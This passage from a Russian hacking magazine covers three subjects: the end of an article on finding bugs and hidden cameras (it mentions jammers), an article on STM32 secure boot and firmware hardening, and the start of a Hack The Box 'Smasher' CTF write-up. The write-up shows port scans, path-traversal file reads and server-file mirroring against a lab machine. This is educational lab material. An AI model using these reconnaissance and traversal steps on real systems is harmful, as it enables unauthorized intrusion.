монизированным образом. Это позволя ет обна руживать даже не под ключен‐
ную к источнику питания электро нику, включая флешки и SIM‐карты. Но,
во‐первых, из‐за такой высокой чувс твительнос ти прибор склонен к ложным
срабатываниям, а во‐вторых, цена на такие устрой ства изме ряется тысячами
долларов.





  Досмотровый нелинейный локатор эконом‐клас са — всего 260 тысяч
  рублей, и он твой

Наконец, если ты думаешь, что все же мог что‐то упус тить, и считаешь, что
твои волнения имеют под собой почву, то используй глушение. Можно глу‐
шить звукозапись, используя дорогие генераторы ультразвукового белого
шума, а можно и просто пошептаться в мес те, где хватает дополнительных
источников звука (впрочем, существуют опять же дорогостоящие зву коза‐
писывающие устрой ства, про изво дители которых расхваливают их способ‐
ности к шумоподавлению).
   Хватает на рын ке и «глушилок» бес проводных сетей и GPS‐трекеров —
причем последние бывают с дополнительной функцией имитации непод‐
вижности. Этим могут, например, пользовать ся водители, за которы ми следят
их работодате ли, чтобы уйти с маршру та под видом стоянки.





  Продвинутый генератор ультраз вукового шума для глу шения звукоза‐
  писи, 900 долларов на Amazon

А вот видеокамеру темнотой не заглушить — инфракрасная подсветка хоть
и не прев ращает ночь в день, но все равно поз воляет видеть в темноте. Зато
именно по ее свету скры тые камеры ста новится еще легче обнаружить.





  Портатив ная глушилка мобильной связи в ироничном форм‐факторе —
  как говорится, для важных переговоров

Впрочем, на рын ке хватает фирм, которые предос тавля ют услуги проверок
такого рода. Если подобные опасности вол нуют тебя всерьез — обратись
к ним и подпиши постоянный контракт. Регулярные проверки — это допол‐
нительный плюс к системе безопасности.


ВЫВОДЫ
Подведем итоги. Устройства скрытого наблюдения — впол не реальная угро‐
за безопасности, но скорее нишевая. Такие устройства есть смысл при‐
менять только там, где они могут принес ти реальный улов, — а в современ‐
ном мире нас тоящие сокровища гораздо чаще лежат на серверах, а не в сей‐
фах.
  Вопросы защиты от жучков тес но смыкаются с повседневными практиками
информационной безопас ности в физической реаль нос ти — теми, которые
призывают не писать пароли на бумажках, не вставлять сомнительные флеш‐
ки и не оставлять ноутбуки и смартфоны без прис мотра.
   Если ты серьезно подозрева ешь, что против тебя могут использовать
такие методы, то у тебя есть неп лохие шансы вычис лить противника‐любите‐
ля. Но, как и с любыми другими методами атаки и защиты, всегда есть воз‐
можность поднять ставки и применить сущес твенно более дорогие и слож‐
ные методы. Вопрос лишь в том, насколько это оправданно. Если считаешь,
что оправданно, — ищи профес сионалов с их инс трументами.
  И самый главный совет: если в съемной квартире на Airbnb ты най дешь
скрытую камеру, не забудь сооб щить администра ции сервиса как можно ско‐
рее — есть шанс не только вернуть день ги, но и вместо неуютной квартиры
с жучками провести отпуск в дорогом отеле.
ВЗЛОМ

   ЗАЩИЩАЕМ
  МИКРОКОНТРОЛЛЕР

      КАК РАБОТАЕТ FIRMWARE HARDENING
      И SECURE BOOT НА ПРИМЕРЕ STM32





                                                                           Александр Бурага
                                                                                       Инженер‐конструктор
                                                                                  радиоэлектронной техники. С
                                                                                вниманием следит за
                                                                                  прогрессом IoT и носимой
                                                                                               электроники.
                                                                                           dtp‐avb@yandex.ru





Астрологи провозгла сили десятилетие атак на устройства
IoT. Новые угрозы требуют комплексного подхода, поэтому
безопасностью встра иваемых систем сегодня озабочены
не только их разработчики, но и про изводители железа.
Сегодня  я  на  примере  отла дочной  платы  Nucleo
с STM32H743 рас скажу, какие векторы атаки стоит рассмат‐
ривать в первую очередь и как можно защитить прошивку
и конфиденциальные дан ные.


Безумная иллюминация в стиле Жа на Мишеля Жарра или новый альбом груп‐
пы Rammstein из колонок в половине пятого утра — это все милые шалос ти
по сравнению с тем, к каким последс твиям может привести взлом автомати‐
ческих кормушек для питомцев или носимых медицинских устройств.
  Обновления «по воз духу» и многочисленные отладочные интерфейсы
умных устройств могут ока заться серь езной дырой в безопасности, которая
позволит опытному злоумышленнику подменить заводскую прошивку своей
собственной, — не говоря уж о банальной краже чужой интеллектуальной
собственности. Глупый, глупый современный IoT!


ДЛЯ ЧЕГО НУЖЕН SECURE BOOT
В общем случае разработчику, который хочет защитить свое устройство,
предстоит решить две ключевые задачи.
 • В первую очередь следует реализовать механизм подтверждения под‐
   линности прошив ки (аутентификации). Для это го используются различные
   криптографические алго ритмы (например, SHA‐256 и NIST P256). Они
   позволяют убе диться,  что на  устрой стве  будет  исполняться  только
   доверенный код.
 • Кроме того, необ ходимо защитить память от внешних атак и лишить зло‐
  умышленника доступа к критичным регионам, который он может в теории
   получить с помощью уязвимос тей ПО либо при использовании отладочных
   интерфейсов (например, JTAG) или логичес кого анализатора.

Итак, это два разных механизма защиты и преследуют они разные цели,
но только их совместное применение поз воляет эффективно бороться
с угрозами. Иными сло вами, даже самые совершенные криптографические
алгоритмы окажутся бесполезными, если хакер может получить расшифро‐
ванный дамп прошив ки. И наобо рот, защищенная от считывания память никак
не предотвратит загрузку прог раммы с вредонос ным кодом.


КАК ЭТО РАБОТАЕТ
Сегодня самый простой способ обновить про шивку устройства (SFU, Secure
Firmware Update) — это отправить ему свежую версию удаленно, «по воз‐
духу». Таким образом, мы храним на сервере и распространяем уже зашиф‐
рованный бинарник, который клиент может ска чать, подтвердить его целос‐
тность, аутентифицировать, расшифровать и, наконец, установить.





Базовую безопасность при этом обеспечива ют следующие меры: во‐первых,
исключается возможность альтернативных методов загрузки. Для этого при‐
меняется подтвержденный Secure Boot, который формирует root of  trust
в нашей системе. Во‐вторых, приват ные ключи шифрования дол жны хранить‐
ся в прошивке устрой ства и быть индивидуальными.





Кроме того, конкретную реализацию криптогра фичес кого алгоритма следует
проверять на устой чивость к АВК (атака по второс тепенным каналам, side‐
channel attack) или АМИС (атака методом индуцированных сбоев, fault injec‐
tion attack). К это му мы еще вернемся.


             INFO

                     Подробнее об АВК читай в нашем материале «Ап‐
                       паратный CTF. Легкий спо соб узнать ключ шиф‐
                       рования устройства,  когда  у тебя под рукой
                       осциллограф и ноутбук». А про АМИС на Ze‐
                          roNights 2019 рассказывал LimitedResults, статью
                      по мотивам док лада тоже можешь почитать у нас:
                            «Взламываем ESP32 раз и навсегда. Извлечение
                     ключей флеш‐шифрования и безопасной  заг‐
                        рузки».


Наконец, следует озаботиться защитой от нежелатель ного внешнего доступа.
К счастью, многие разработчики уже научились отключать JTAG — самый
желанный подарок для злоумышленника. Однако производите ли не стоят
на месте и предлагают сегодня дополнительные средства обнаружить воз‐
действие,  такие  как  Anti‐Tamper. Ими  поль зуются  пока не  так  час то,
как хотелось бы.


АППАРАТНЫЕ СРЕДСТВА
Посмотрим  теперь,  как  выглядит применение подобных рекомендаций
на практике, для линейки микроконтроллеров STM32.


        WWW

                      Стоит заметить, что набор доступных средств
                     защиты зависит от конкретного семейства МК (F,
                       G, L и H). Демонстрационные примеры в пакете
                    X‐CUBE‐SBSFU   охватывают   большую   часть
                       из этого набора, но за полной информацией
                        в любом случае следует обращаться к докумен‐
                         тации. Кон крет но сегодня нас интересуют:
                     •AN5156 — ключевой материал о безопасности
                       микроконтроллеров STM32;
                    •UM2262 — руководство по фреймворку SBSFU
                         в пакете XCUBE;
                     •AN4838 — апноут для MPU (Memory Protection
                                Unit);
                    •PM0253 —  мануал  по  механизмам защиты
                         для ядра Cortex‐M7;
                      •DS12110 — даташит на МК H743;
                    •RM0443 — референс на МК H743.

                     Все ссылки — на PDF.



Защита от чте ния, RDP
Это базовый механизм  безопасности,  который пре дотвращает дос туп
к содержимому памяти микроконтроллера различны ми отладочными средс‐
твами (JTAG, SWV и ETM). Его применение рекомендуется во всех случаях
на готовых серийных устройствах. Отключение RDP возможно только для пер‐
вого уровня защиты и приводит к стиранию содержимого флеш‐памяти.
Вклю чение второго уровня — необратимая операция для микросхемы.
   Теоретически все это может осложнить сервисное обслу живание и поиск
причины  неисправности  воз вра щен ного  пользователем  оборудования.
Однако, так как само приложение все равно сохраняет способность писать
в постоянную память и изменять ее, воз можность обновлений прошивки (в
том числе с помощью SFU) остается. При вклю ченном RDP попытка дос тупа
к защищенному участку памяти приводит к генерации ошибки на шине AHB.
  На H743 за эту функцию отвечают биты RDP [15:8] в паре регистров
FLASH_OPTSR_CUR и FLASH_OPTSR_PRG из области Option Bytes. При этом зна‐
чение 0xAA соответствует нулево му уровню защиты (по умол чанию), значение
0xCC — первому, а любое другое — второму (максимальному) уровню.


             INFO

                   Формально на диаграммах STMicroelectronics Op‐
                             tion Bytes относятся к внут ренней флеш‐памяти,
                      однако непосредствен ный доступ к ним невоз‐
                      можен. Для взаимодействия и внесения изме‐
                      нений пользовате лю нужно обращаться к регис‐
                      трам и следовать определенной процедуре (под‐
                      робнее см. раздел Option Bytes Modiﬁcation на с.
                       157 RM0433).



Защита от записи, WRP
Эта мера безопасности дополняет RDP и направлена не только на защиту
содержимого флеш‐памяти от внеш них угроз (инъекция вредоносного кода
и последующее его исполнение), но и от оши бочного выхода за границы мас‐
сивов и перепол нения буферов в пользовательских функциях. Простая
в использовании, WRP также рекомендуется про изводите лем в самых разных
ситуациях.
   Гибкость этого механиз ма поз воляет защищать от записи как отдельные
страницы, так и целые сектора памяти (подробнее см. в документации).
Дополнительно перед включением WRP можно заполнить свободное прос‐
транство инструкциями NOP или WFI — лишним это точно не будет.
  На H743 пользователю дос тупны 2 Мбайт флеш‐памяти, которые раз‐
делены на два банка (по адресам 0x0800 0000 — 0x080F FFFF и 0x0810
0000 — 0x081F FFFF соот ветственно). Каж дый банк, в свою очередь, раз‐
делен на восемь секторов по 128 Кбайт. За функцию WRP отвечают биты
[7:0] в регистрах FLASH_WPSN_XX.


Только исполне ние, PCROP
Название этого аппарат ного механизма может вводить в заблуждение. Дей‐
ствительно, первая часть заставляет вспомнить о Program Counter, тогда
как вторая — ReadOut Protection — как будто уже встречалась и непонятно,
чем отличается от рассмотренного выше RDP.
  На самом деле Proprietary Code ReadOut Protection выполняет схожие фун‐
кции, но если RDP блокиро вал несанкциони рованный доступ к памяти через
отладочные интерфейсы микроконтроллеров, то PCROP защищает от более
изощренных атак, нацеленных на кражу самой прошивки устрой ства через
использование уязвимостей или ошибок в ПО.
  Пометив с помощью регистров FLASH_PRAR_PRGX диапазон адресов
во флеш‐памяти флагом «только исполне ние», разработчик может защитить
интеллектуальную собственность своей компании (готовые библиоте ки и кус‐
ки кода) от копирования и обратной раз работки. Содержимое флеш‐памяти
из такой области будет подаваться исключительно на шину инструкций про‐
цессора.
  К сожалению, использование такой технологии на практике ведет к гра‐
нуляции внутренней памяти: так, на нашей микросхеме H743 под PCROP
в каждом банке памяти может быть выделена толь ко одна область (итого —
не более двух на мик росхему). При этом область должна быть кратна размеру
блока (256 байт) и выровнена по соответс твующей границе.


Бе зопасный доступ, SAO
Пожалуй, это одна из самых интересных функций защиты памяти на STM32.
Настолько интересная, что про изво дитель даже толком не смог определиться
с ее названием: где‐то в документации она обоз начена как Secure User Mem‐
ory (AN5156), где‐то — как Secure Access Only (RM0443). А для серии
G0/G4 это вообще Securable Area!
   Если коротко — область памяти с безопас ным доступом используется
для создания унифицированного метода загрузки сразу после сигнала сбро‐
са. Такой код обладает исклю читель ными правами на  чте ние, запись
и исполнение в заданном диапазоне адресов. Изо ляция от остальной части
программы происходит при этом на аппаратном уровне.
  SAO на STM32 предназначена в первую очередь для размещения Secure
Boot и формирования цепочки доверия в системе. Именно здесь стоит хра‐
нить свои ключи и алго ритмы шифрования для проверки целостности и аутен‐
тификации  образа  основной  про шивки  перед  передачей  управле ния
в основную программу. Как и для остальных механизмов защиты, за раз‐
мещение SAO во фле ше отвечают регистры в Option Bytes: FLASH_SCAR_CURX
и FLASH_SCAR_PRGX.


           WARNING

                      Работая  с  серией  H7,  не  следует  путать
                      флеш‐память с безопасным доступом (Secure)
                      и системную память (System). Последняя всегда
                       находится несколько «сбоку» от основно го мас‐
                       сива памяти (адреса с 0x1FF0 0000 по 0x1FF5
                   0000). На  всех  схемах  от  STMicroelectronics
                        область  системной  памяти  в  первом  банке
                         (которая служит для хранения кода DFU‐загрузчи‐
                           ка) помечена как Secure. Однако аналогичный
                       свободный сектор во втором бан ке хоть и сис‐
                       темный, но небезопасный (по умолчанию)! Кста‐
                            ти,  фактически,  это  «лишние»  128  Кбайт,
                       на которые ты всегда можешь рассчитывать.



Блок защиты памяти, MPU
Рассмотренные механизмы безопасности обладают одним общим свой‐
ством: все они статичные, то есть жестко заданы на момент выполнения прог‐
раммы. Само по себе это нельзя отнести к недос таткам, однако исполь‐
зование в сложном проекте операционной системы с несколькими процес‐
сами неизбежно порождает необходимость динамического распределе ния
прав доступа к тем или иным областям памяти. За это и отвечает MPU (Memo‐
ry Protection Unit).
   Блок защиты памяти относится к возможностям самого процес сорного
ядра, в нашем случае — Cortex‐M7 (стоит заметить, что из всей линейки ARM
Cortex‐M лишь семейство M0 лишено MPU). Из этого вытекают следующие,
вполне  логичные  рассуждения: MPU  способен  контролировать  доступ
к любому компонен ту, так или ина че отоб раженному в адресное пространс‐
тво процессора. Таким образом, мы можем использовать этот блок не только
для   очевидных   вещей,   вроде   обес печения   безопасности  ОЗУ
и флеш‐памяти, но и для огра ничения прав на перифе рию: интерфейсы,
регистры, что угодно.
   Второе важное наблюдение: MPU контролирует CPU, но никак не DMA (Di‐
rect Memory Access, пря мой дос туп к памяти). А ведь они тоже могут быть
ведущими на внутренних шинах микроконтроллера! К счастью, возможности
DMA по сравнению с CPU сильно огра ничены. За исключением, может быть,
специализированного DMA2D (Chrom‐ART). Сущес твует ли на свете пример
с эксплуатацией DMA2D для обхо да MPU и компрометации реального
устройства? Я не знаю, но дорого бы дал за то, чтобы взглянуть на подобное!
:)
  Наконец, следствие третье: документацию на блок защиты памяти сле дует
искать никак не в референсе (и уж точно не в даташите) на микроконтроллер.
Тут прямая дорога к руководс тву PM0253 на само ядро. Если раньше ты обхо‐
дил этот материал стороной («Ну он же для системных программистов и раз‐
работчиков ком пиляторов!»), то теперь придет ся читать, ничего не подела‐
ешь. Ну и конечно, сам апноут AN4838 по применению MPU тоже нужно знать.


Об наруже ние воз действия, Anti-Tamper
Следующий механизм защиты работает тоже в динамике, но уже не на уровне
самого микроконтрол лера или его ядра, а на уровне готового, законченного
устройства. У разработчика есть возможность использовать спе циализиро‐
ванные выводы микросхемы, объединенные с областью малопотребля ющей
периферии (часы реального времени и резервная SRAM), для обнаруже ния
попыток несанкционированного дос тупа к устройству. Например, вскры тие
корпуса или аномально силь ное воздействие («тяжелым тупым предметом»,
как это пишут в полицейских отчетах).
   Как ты наверняка уже знаешь, на микроконтроллере H743 есть три области
(domains), разделенные по быстродействию и энергопотреблению. В D1 рас‐
положено само ядро Cortex‐M7, боль шая часть внутренней SRAM и самая
скоростная периферия: FMC, LTDC, QSPI и прочее. В D2 работают стандар‐
тные интерфейсы: ETH, USB и MMC. А вот в D3 размещена та самая малопот‐
ребляющая перифе рия, которая сохраняет свою работоспособность даже
при батарейном питании.
   Таким образом, используя выводы Anti‐Tamper МК, мы можем зафик‐
сировать попытку взлома и аппа ратно очистить регистры RTC и резервное
ОЗУ в D3 со все ми хранившимися там секретами, даже если злоумышленник
заблаговременно отключил устройство от основного питания! Это гарантиру‐
ет, что конфиденциальная информа ция не попадет в чужие руки, а сервисное
обслуживание легко выявит неладное.


                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ

        ЗАЩИЩАЕМ
  МИКРОКОНТРОЛЛЕР
                 КАК РАБОТАЕТ FIRMWARE HARDENING
               И SECURE BOOT НА ПРИМЕРЕ STM32





Сто роже вой таймер, IWDG
Наконец, последний в нашем списке (но оттого ничуть не менее важный)
механизм защиты — это независимый сто рожевой таймер. Стандартно его
используют для принудитель ной перезаг рузки микроконтрол лера, если прог‐
рамма столкнулась с критичес кой ошибкой или ушла в бес конечный цикл.
  Однако, посколь ку IWDG тактируется от внутренне го LSI, это позволяет
успешно сверяться с ним при выполнении кри тичных участков кода, которые
могут стать первой целью прес тупников (различные АМИС по питанию, так‐
товому сигналу или ЭМИ). Кроме того, IWDG может принудительно перезаг‐
ружать основной процессор, если тот не был вовремя проини циализирован
(не выполнился загрузчик или не прошла установка обновле ния).
  IWDG относится к базовой периферии и встречается на любом современ‐
ном микроконтрол лере. Неудивительно, что на Н743 он тоже присутс твует.


Внеш ний флеш
Перечисленные методы защиты МК рекомендуются производителем, и с
необходимостью их применения трудно спорить (с учетом нынешних угроз
«интернету вещей»). Однако особен но акту альной концепция Secure Boot
и Secure Firmware Update ста новится при исполь зовании внешней микросхе‐
мы флеш‐памяти для хра нения прошивки и пользовательских данных. Такие
микроконтроллеры достаточно дешевы для сво их возможностей. Например,
STM32H750 с частотой 480 МГц содержит всего 128 Кбайт памяти, но стоит
при этом порядка 7 долларов. Его контроллер Quad SPI поз воляет не только
отображать внешний флеш в адресное прос транство процес сора, но и
исполнять из него код практически без потерь в производительности.



КРИПТОГРАФИЯ
Разобравшись с аппаратными компонентами защиты, рассмотрим теперь,
как формируется образ пользовательской прошивки Secure Boot. Нам пот‐
ребуется мануал UM2262.
  На стороне сервера процесс выглядит следующим образом. Сперва
по алгоритму SHA‐256 рассчитыва ется хеш от итогового значения прошивки
и помещается в заголовок. Далее генери руется пара ключей (приватный
и публичный) на основе эллиптических кривых NIST P256 и подписывается
бинарник (ECDSA). На финальном этапе заголовок и прошивка шиф руются
с помощью алгоритма AES CBC и получившийся файл вместе с IV отправ‐
ляется пользователю для заг рузки.
  На  стороне  устрой ства  пос ледова тельность  действий  выполняется
в обратном порядке, с минимальными изменениями. Стоит заметить, что «из
коробки» Secure Boot поддерживает следующие схемы:
 • SECBOOT_ECCDSA_WITHOUT_ENCRYPT_SHA256 (образ без шифрования,
   аутентификация ключом ECCDSA);
 • SECBOOT_ECCDSA_WITH_AES128_CBC_SHA256 (шиф рование AES, аутен‐
   тификация клю чом ECCDSA);
 • SECBOOT_AES128_GCM_AES128_GCM_AES128_GCM  (шифрование  AES,
   аутентификация симметричным клю чом).


             INFO

                 Любопытная  деталь —  все  алгоритмы шиф‐
                       рования в пакете Secure Boot реализова ны прог‐
                     раммно,  даже  для  тех  микроконтроллеров,
                       на борту которых имеются крип тографические
                        ускорители  (блоки  CRYP  и  HASH).  Видимо,
                        в STMicroelectronics работу со столь специфич‐
                      ной периферией оставля ют на усмотрение поль‐
                        зовате ля.



Пользовательская схе ма шифрования
При желании разработчик может реализовать работу Secure Boot с собс твен‐
ными алгоритмами. Для это го сперва нужно дать криптографической схеме
произвольное название в виде определения в SECoreBin/Inc/se_crypto_‐
config.h. Далее модифицируется описание заголовка пользовательской
прошивки  в SECoreBin/Inc/se_def_metadata.h, после  чего предстоит
реализовать функции в соответствии с интерфейсом загрузчика (см. SECore‐
Bin/Src/se_crypto_bootloader.c).
   Теперь остается толь ко модифицировать скрипты key.py, prepareimage.
py и translate_key.py соот ветствующим обра зом и интегрировать со своей
средой разработки. Наиболее прос той вариант — формирование файла
SECBOOT_CUSTOM.bat совместно с prebuild.bat и postbuild.bat.


РЕАЛИЗАЦИЯ ДЛЯ H743
Теперь, когда мы разоб рались в основных компонентах Secure Boot, нам
предстоит портировать базовый проект от ST на отладочную плату Nucleo‐
H743. Непосредственно для нашей отладки примера реализации в пакете
нет, однако он существует для «старшего бра та» — Н753. Эти микросхемы
во многом идентичны, за исключением аппаратного криптографичес кого
ускорителя на Н753. Это важное отличие, но для наших сегодняшних целей
оно некритично, так что возьмем Н743 в качестве основы.
  Под нашу платформу в пакете есть две реализации, которые отличаются
количеством слотов в памяти МК под акту аль ную прошивку (конфигурации
с одним или двумя сло тами). В свою очередь, каждая реализация содержит
по три проекта.


        WWW

                     Все исходные коды доступны для  скачивания
                       на сайте ST. Там же следует искать и ути литу
                       для прошивки и настройки MPU.


В опциях проекта желательно заменить макроопределение STM32H753xx
на STM32H743xx, после чего нуж но откомпилировать проекты в сле дующем
порядке.





Image_SECoreBin
Здесь находится реализация базовых криптогра фичес ких функций. Необ‐
ходимо указать схему в определении SECBOOT_CRYPTO_SCHEME — либо
из готовых примеров производителя, либо поль зовательское шифрование.
Также  следует  задать  приватный  ключ  в  файлах  OEM_KEY_COMPA‐
NY1_key_AES_XXX.bin. Далее при вызове скрипта prebuild.sh они сохраня‐
ются в двоичном виде в файле se_key.s.





Image_SBSFU
Непосредственно загрузчик SBSFU, который также отвечает за функции
безопасного  обновления и предос тавляет  транспортный  уровень  (для
базовых примеров это Y‐MODEM). Именно загрузчик отвечает за подклю‐
чение всех реализованных алго ритмов криптогра фии. Ядро Secure Boot лин‐
куется в проект в виде библиотеки. Далее скомпилированный файл можно
прошить  в память микроконтроллера при помощи  утилит  STlink  Utility
или STM32CubeProgrammer.


Image_UserApp
Это базовый пример пользовательского при ложения. В данном случае у нас
есть простой текстовый интерфейс, который позволяет проверять защиту,
выводить служебную информацию и перепрошивать устройство. При помощи
postbuild.sh из скомпилированного файла формируется цифровая подпись
UserApp.sfb, которую следует передать в наш загрузчик через Y‐MODEM.
SBSFU проверяет кор ректность подписи, после чего сохраняет ее в выделен‐
ной SAO памяти.





           WARNING

                    Важный момент: в полноценном режиме проект
                   SBSFU предполагает отклю чение средств отладки
                     микроконтроллера. Для сброса PCROP и рекон‐
                      фигурации уровня RDP на отладочной пла те нуж‐
                      но зажать кнопку Reset и в утилите STM32Cube‐
                       Programmer подключиться в режиме Connect un‐
                         der reset. Напомню, если изменить RDP, будет
                      сброшена внутренняя флеш‐память, в том числе
                       удалены ключи шифрования.



Про шивка и настройка Option Bytes
Наконец, нам предстоит самостоятельно выставить OB в нужный режим
работы. Во‐первых, переводим RDP на первый уро вень защиты (см. опи‐
сание выше). Далее указываем зна чения для PCROP и WRP по получившимся
адресам в памяти. Все готово! Теперь при перезаг рузке МК мы можем под‐
клю читься по терминалу (предос тавляется отла дочной платой в виде VCP)
и прочитать приветствие от Secure Boot. Все стандартные средства безопас‐
ности от STMicroelectronics включены и работают в штатном режиме.





             INFO

                      Если тебе и этого недостаточно, то можешь пос‐
                       мотреть в сторону более специфичных решений.
                     Например, STSAFE‐A100 и плата расширения Nu‐
                          cleo на его основе. Для встраиваемых систем
                        это почти как TPM для ПК. Однако учти, что дан‐
                       ная штука под NDA и ST вряд ли расстанет ся
                        с ней просто так. Но ты ведь наверняка что‐то
                      придумаешь? :)



ЗАКЛЮЧЕНИЕ
Как ты уже понял, Secure Boot достаточно прос той и удоб ный при портирова‐
нии фреймворк, который позволяет реализовать загрузку и обновление про‐
шивки в устройстве с минимумом ненужных телодвижений. Это заметно
повысит защищен ность устройства и зас тавит злоумышленников лишний раз
усомниться в выборе цели.
  Однако, разумеется, абсолютно безопас ных решений не существует
и  даже  тщательное  следование  всем  рекомендациям  производите ля
не гарантирует пол ного отсутс твия уязвимос тей. Физические устройства,
как объекты реального мира, предос тавляют значительно больше информа‐
ции и способов взаимо действия, чем может показаться на первый взгляд.
  Пытливый хакер может обойти даже эшелони рованную оборону, воздей‐
ствуя на микросхему ультра фиолетом, анализируя трассы энергопотребле‐
ния или генерируя электромагнитные помехи специальным оборудовани ем.
Но об этом как‐нибудь в другой раз. До встречи!
ВЗЛОМ

В КОРОЛЕВСТВЕ
    PWN

            АТАКА RET2BSS,
      КРИПТООРАКУЛЫ И РЕВЕРС‐
     ИНЖИНИРИНГ НА ВИРТУАЛКЕ
       SMASHER С HACK THE BOX





В этой статье тебя ждут: низкоуровневая
эксплуатация веб‐сервера со срывом стека
и   генерацией   шелл‐кода   на   лету
с помощью древней магии pwntools; ата ка
Padding Oracle на питоновское приложение             snovvcrash                                                                                        Безопасник, временами
для вскрытия шифртекста AES‐CBC, а так‐        криптоана(рхист)литик,питонщик, местами по
же реверс‐инжиниринг исполняемо го фай‐       необходимостиадминистраторсистемный
ла с атрибутом SUID для повышения при‐        snovvcrash@protonmail.ch
вилегий в сис теме до локального супер‐
пользователя.


Все это мы проделаем на пути к root‐флагу виртуал ки Smasher (уровень слож‐
ности Insane — 7,6 балла из 10) с CTF‐площадки Hack The Box. Пос кольку
речь в основном пой дет о срыве стека, это будет отличным завершением
для нашего цикла «В королевстве PWN».





                       HTB — Smasher


          PWNВ королевс тве
В этом цикле статей мы изу чаем раз ные аспекты атак типа «переполнение
стека». Читай также:
 • «Препарируем классику переполнения буфера в современных условиях»
 • «Обходим DEP и брутфорсим ASLR на вир туалке с Hack The Box»
 • «ROP‐цепочки и атака Return‐to‐PLT в CTF Bitterman»




РАЗВЕДКА
Сканиро вание портов
Я продолжаю извращаться с метода ми обнаружения откры тых портов,
и в этот раз будем поль зовать ся связкой из Masscan и Nmap. Masscan, к сло‐
ву, на сегодняшний день самый быстрый из асинхронных сканеров портов.
Ко всему прочему он опирается на собственное видение стека TCP/IP и, по
словам разработчика, может просканиро вать весь интернет за шесть минут
с одного хоста.



  root@kali:~# masscan ‐‐rate=1000 ‐e tun0 ‐p1‐65535,U:1‐65535 10.10.10.89
  > ports


Первой командой я инициирую ска нирование всего диапазона портов (в том
числе UDP) IP‐адреса, по которому живет Smasher, и перенаправляю резуль‐
тат в текстовый файл.



  root@kali:~# ports=`cat ports | awk ‐F " " '{print $4}' | awk ‐F "/" '{
  print $1}' | sort ‐n | tr "\n" ',' | sed 's/,$//'`
  root@kali:~# nmap ‐n ‐Pn ‐sV ‐sC ‐oA nmap/smasher ‐p$ports 10.10.10.89


Далее с помощью стандартных средств текстового процессинга в Linux обра‐
батываю результаты ска на, чтобы найденные порты хранились одной строкой
через запятую, сохраняю эту строку в переменной ports и спус каю с поводка
Nmap.





                  Сканирование пор тов ВМ Smasher

По мнению Nmap, мы имеем дело с Ubuntu 16.04 (Xenial). Оно основано
на информации о баннере SSH. Постучаться же можно в порты 22 и 1111.
На последнем, кстати, висит некий shenfeng tiny‐web‐server — вот его мы
и отправимся исследовать в первую очередь.


Веб — порт 1111
Браузер
По адресу http://10.10.10.89:1111/ тебя встретит листинг корневой
директории веб‐сервера.





              Листинг кор невой директории веб‐сервера

Интересно, что страница index.html сущес твует, но редиректа на нее нет —
вместо этого открывается список файлов каталога. Запомним это.





                Форма авторизации /index.html

Если мы перейдем на /index.html вручную, то уви дим неработающую заг‐
лушку для формы авториза ции (можно печатать в полях ввода, но кнопка Lo‐
gin не работает). Забавно, что оба поля для вво да называются input.email.





             Наименования полей формы авторизации


A tiny web server in C
Если поискать shenfeng tiny‐web‐server в Сети, по первой же ссылке в выдаче
результатов можно найти репозиторий про екта на GitHub.
  Сразу же бросаются в глаза предупреждения, что код небезопасен: пер‐
вое в самом описании сервера (как единственная его «анти фича»), второе —
в открытых issues.





         Проблема безопас ности tiny‐web‐server (Path Traversal)

Если верить описанию, то tiny‐web‐server подвержен Path Traversal, а воз‐
можность просматривать листинги директорий как будто шепчет тебе на ухо:
«Так оно и есть…»


АНАЛИЗ TINY-WEB-SERVER
Проверим выпол нимость Path Traversal. Так как Firefox любит исправлять син‐
таксически некорректные конс трукции в адресной строке (в частнос ти, резать
префиксы вида ../../../), то я сделаю это с помощью nc, как показано
в issue.





      PoC уязвимости выхода за корневую директорию веб‐сервера

Что и требовалось доказать — у нас есть воз можность читать файлы на сер‐
вере!
   Что дальше? Осмотримся. Если дублировать первичный слеш для доступа
к каталогам, сервер подума ет, что таким образом мы обращаемся к корневой
директории, — и разведку можно будет про вести пря мо из браузера.





                     Содержимое /home

В /home нам доступна всего одна директория — /www.





                   Содержимое /home/www

Из интересного здесь — скрипт restart.sh для перезапуска инстанса про‐
цесса сервера, а также сама директория с проектом.


#!/usr/bin/env bash


# Please don’t edit this file let others players have fun


cd /home/www/tiny‐web‐server/
ps aux | grep tiny | awk '{print $2}' | xargs kill ‐9
nohup ./tiny public_html/ 1111 2>&1 > /dev/null &





             Содержимое /home/www/tiny‐web‐server

Чтобы не мучиться с загрузкой каж дого файла по отдельности, я клонирую
директорию /home/www целиком с помощью wget, исключив каталог .git, —
различия в коде веб‐сервера по сравнению с GitHub‐версией мы узнаем чуть
позже другим спо собом.



  root@kali:~# wget ‐‐mirror ‐X home/www/tiny‐web‐server/.git
  http://10.10.10.89:1111//home/www/





              Клонирование /home/www с помощью wget

Три файла представляют для нас интерес: Makefile, tiny и tiny.c.





                Листинг локальной копии /home/www

В Makefile содержатся инс трукции для сборки исполняемого фай ла.


CC = c99
CFLAGS = ‐Wall ‐O2


# LIB = ‐lpthread


all: tiny


tiny: tiny.c
    $(CC) $(CFLAGS) ‐g ‐fno‐stack‐protector ‐z execstack ‐o tiny tiny
.c $(LIB)


clean:
    rm ‐f *.o tiny *~

Флаги ‐g ‐fno‐stack‐protector ‐z execstack намекают нам на пред‐
полагаемый «по сюжету» вектор ата ки — срыв стека, который, надеюсь, уже
успел тебе полюбиться.
  Файл tiny — сам бинарник, который раз вернут на Smasher.





        Сводка безопас ности исполняемого файла tiny (checksec)

У нас есть исполняемый стек, сегменты с воз можностью записи и исполнения
произвольных данных и активный механизм FORTIFY — последний, правда,
ни на что не повлияет в нашей ситуации (подробнее о нем можно прочесть в
первой части цикла, где мы раз бирали вывод checksec). Плюс нужно пом‐
нить, что на целевом хос те, скорее всего, активен механизм рандомизации
адресного пространства ASLR.
  Прежде чем перейти непосредственно к спло итингу, пос мотрим, изме нил
ли как‐нибудь автор машины исходный код tiny.c (сам файл я положу к себе
на гитхаб, чтобы не загромождать тело статьи).


Из менения в исходном коде tiny.c
Если нужно построч но сравнить тексто вые файлы, я пред почитаю рас‐
ширение DiﬀTabs для Sublime Text, где — в отличие от дефолтного diff —
есть подсветка синтаксиса. Одна ко, если ты привык работать исключительно
из командной строки, colordiff станет удоб ной альтернативой.
  Выдернем последнюю версию tiny.c с гитхаба (будем звать ее tiny‐
github.c) и сравним с тем исходником, который мы захватили на Smasher.



  root@kali:~# wget ‐qO tiny‐github.c
  https://raw.githubusercontent.com/shenfeng/tiny‐web‐server/master/tiny.c
  root@kali:~# colordiff tiny‐github.c tiny.c



